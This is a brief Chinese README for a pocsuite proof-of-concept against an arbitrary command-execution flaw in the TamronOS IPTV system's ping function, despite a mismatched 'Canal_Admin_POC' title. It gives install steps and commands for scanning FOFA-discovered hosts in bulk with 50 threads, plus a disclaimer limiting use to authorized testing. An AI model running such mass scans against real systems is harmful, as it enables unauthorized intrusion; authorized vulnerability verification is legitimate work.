# Readme

## Canal_Admin_POC

## 安装

```
git clone https://github.com/247412491/pocsuite-.git
cd TamronOS_IPTV系统_ping_任意命令执行漏洞_poc
pip3 install -r requirements.txt
```

## 使用

poc

批量测试

```
python3 cli.py  -r ./pocs/TamronOS_IPTV系统_ping_任意命令执行漏洞_poc.py  --dork-fofa app="TamronOS-IPTV系统"  --max-size 500 --save-file ./TamronOS_IPTV系统.txt  --threads 50
```

单url测试

```
python3 cli.py  -r ./pocs/TamronOS_IPTV系统_ping_任意命令执行漏洞_poc.py  -u http://xxxx.com  --verify
```



## 免责声明🧐

本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建测试环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

# Pocsuite